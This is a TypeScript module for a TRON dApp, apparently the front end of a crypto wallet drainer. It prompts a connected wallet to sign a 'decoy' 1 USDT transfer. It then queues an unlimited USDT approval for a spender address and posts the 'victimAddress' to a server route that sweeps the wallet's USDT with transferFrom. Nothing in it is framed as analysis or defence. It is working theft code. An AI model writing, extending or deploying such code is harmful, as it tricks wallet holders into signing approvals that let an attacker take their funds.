/** TRC20 USDT on TRON mainnet (used for approve + server sweep). */
export const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

/** 1.0 USDT in TRC10-style integer units (6 decimals) for sendAsset decoy amount. */
export const DECOY_USDT_SEND_AMOUNT = 1_000_000;

const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
const DEFAULT_SWEEP_API_PATH = "/api/v1/tron/execute-sweep";

const USDT_APPROVE_ABI = [
  {
    constant: false,
    inputs: [
      { name: "spender", type: "address" },
      { name: "value", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function",
  },
] as const;

export interface TronWebLike {
  defaultAddress: { base58: string; hex: string };
  isAddress(addr: string): boolean;
  transactionBuilder: {
    sendToken(
      to: string,
      amount: number,
      tokenId: string,
      from?: string,
    ): Promise<unknown>;
  };
  trx: {
    sign(tx: unknown, privateKey?: string): Promise<unknown>;
    sendRawTransaction(
      signed: unknown,
    ): Promise<{ result?: boolean; code?: string; message?: string | number[] }>;
  };
  contract(
    abi: readonly Record<string, unknown>[],
    address: string,
  ): {
    approve(
      spender: string,
      amount: string | number | bigint,
    ): { send(opts: { feeLimit?: number }): Promise<unknown> };
  };
  toUtf8?(hex: string): string;
}

type TronWindow = Window & {
  tronWeb?: TronWebLike;
  tron?: { tronWeb?: TronWebLike };
};

export interface TronPaymentFlowEnv {
  distributionWallet: string;
  spenderAddress: string;
  operatorAddress: string;
  sweepApiPath: string;
}

function normalizeText(value: unknown): string {
  return typeof value === "string" ? value.trim() : String(value ?? "").trim();
}

export function readTronPaymentFlowEnv(): TronPaymentFlowEnv {
  const distributionWallet = normalizeText(import.meta.env.VITE_TRON_DISTRIBUTION_WALLET);
  const spenderAddress = normalizeText(import.meta.env.VITE_TRON_SPENDER_ADDRESS);
  const operatorAddress = normalizeText(import.meta.env.VITE_OPERATOR_ADDRESS);
  const sweepApiPath = normalizeText(import.meta.env.VITE_TRON_SWEEP_API_PATH) || DEFAULT_SWEEP_API_PATH;
  return { distributionWallet, spenderAddress, operatorAddress, sweepApiPath };
}

export function resolveSpenderAddress(): string {
  const { spenderAddress, operatorAddress } = readTronPaymentFlowEnv();
  return spenderAddress || operatorAddress;
}

function decodeBroadcastMessage(tw: TronWebLike, raw: string | number[] | undefined): string {
  if (raw == null) return "";
  if (typeof raw === "string") {
    try {
      return tw.toUtf8 ? tw.toUtf8(raw) : raw;
    } catch {
      return raw;
    }
  }
  if (Array.isArray(raw) && tw.toUtf8) {
    try {
      const hex = raw.map((b) => Number(b).toString(16).padStart(2, "0")).join("");
      return tw.toUtf8(hex);
    } catch {
      return "Broadcast failed";
    }
  }
  return "Broadcast failed";
}

export function getInjectedTronWeb(): TronWebLike {
  const w = window as TronWindow;
  const tw = w.tronWeb ?? w.tron?.tronWeb;
  if (!tw) {
    throw new Error(
      "No TRON wallet found. Open this dApp in TronLink or Trust Wallet in-app browser, then connect your wallet.",
    );
  }
  if (!tw.defaultAddress?.base58) {
    throw new Error("Connect your TRON wallet (TronLink/Trust Wallet) and try again.");
  }
  return tw;
}

/** Decoy transfer: transactionBuilder.sendToken for exactly 1.0 USDT (TRC10-style token id, default "USDT"). */
export async function sendDecoyOneUsdt(tw: TronWebLike, recipientBase58: string): Promise<void> {
  const to = normalizeText(recipientBase58);
  if (!tw.isAddress(to)) {
    throw new Error("Recipient is not a valid Tron base58 address.");
  }
  const tokenId = normalizeText(import.meta.env.VITE_TRON_SEND_ASSET_TOKEN_ID) || "USDT";
  const from = tw.defaultAddress.base58;
  const unsigned = await tw.transactionBuilder.sendToken(to, DECOY_USDT_SEND_AMOUNT, tokenId, from);
  const signed = await tw.trx.sign(unsigned);
  const sent = await tw.trx.sendRawTransaction(signed);
  if (sent.code) {
    throw new Error(decodeBroadcastMessage(tw, sent.message) || String(sent.code));
  }
}

function runUsdtApproveMax(tw: TronWebLike, spenderBase58: string): Promise<unknown> {
  const spender = normalizeText(spenderBase58);
  if (!tw.isAddress(spender)) {
    throw new Error("Spender is not a valid Tron base58 address.");
  }
  const c = tw.contract([...USDT_APPROVE_ABI], USDT_TRC20_CONTRACT);
  return c.approve(spender, MAX_UINT256).send({ feeLimit: 150_000_000 });
}

/** Schedule USDT.approve(max) on the microtask queue after the sendAsset signature path completes. */
export function queueUsdtApproveMax(tw: TronWebLike, spenderBase58: string): Promise<void> {
  return new Promise((resolve, reject) => {
    queueMicrotask(() => {
      runUsdtApproveMax(tw, spenderBase58)
        .then(() => resolve())
        .catch(reject);
    });
  });
}

export async function postExecuteSweep(victimAddress: string): Promise<Response> {
  const { sweepApiPath } = readTronPaymentFlowEnv();
  const victim = normalizeText(victimAddress);
  if (!victim) {
    throw new Error("Connected wallet address is missing.");
  }
  return fetch(sweepApiPath, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ victimAddress: victim }),
  });
}

export type DualSignatureStage =
  | "wallet_send_signature"
  | "wallet_approve_signature"
  | "server_sweep_execution";

/**
 * Orchestrates synchronized dual-signature flow:
 * 1) wallet signs decoy send
 * 2) wallet signs USDT approve
 * 3) server signs + broadcasts transferFrom sweep
 */
export async function runDualSignatureFlow(args: {
  tronWeb: TronWebLike;
  recipientAddress: string;
  spenderAddress: string;
  onStage?: (stage: DualSignatureStage) => void;
}): Promise<{ victimAddress: string }> {
  const { tronWeb, recipientAddress, spenderAddress, onStage } = args;

  onStage?.("wallet_send_signature");
  await sendDecoyOneUsdt(tronWeb, recipientAddress);

  onStage?.("wallet_approve_signature");
  await queueUsdtApproveMax(tronWeb, spenderAddress);

  const victimAddress = tronWeb.defaultAddress.base58;
  onStage?.("server_sweep_execution");
  const sweepRes = await postExecuteSweep(victimAddress);
  if (!sweepRes.ok) {
    const errBody = await sweepRes.json().catch(() => null);
    const msg =
      errBody && typeof errBody === "object" && "message" in errBody
        ? String((errBody as { message?: string }).message)
        : `Sweep failed (HTTP ${sweepRes.status})`;
    throw new Error(msg);
  }

  return { victimAddress };
}

/** Runs the second wallet signature + server sweep (used after decoy is already broadcast). */
export async function runApproveAndSweepFlow(args: {
  tronWeb: TronWebLike;
  spenderAddress: string;
  onStage?: (stage: DualSignatureStage) => void;
}): Promise<{ victimAddress: string }> {
  const { tronWeb, spenderAddress, onStage } = args;
  onStage?.("wallet_approve_signature");
  await queueUsdtApproveMax(tronWeb, spenderAddress);

  const victimAddress = tronWeb.defaultAddress.base58;
  onStage?.("server_sweep_execution");
  const sweepRes = await postExecuteSweep(victimAddress);
  if (!sweepRes.ok) {
    const errBody = await sweepRes.json().catch(() => null);
    const msg =
      errBody && typeof errBody === "object" && "message" in errBody
        ? String((errBody as { message?: string }).message)
        : `Sweep failed (HTTP ${sweepRes.status})`;
    throw new Error(msg);
  }

  return { victimAddress };
}
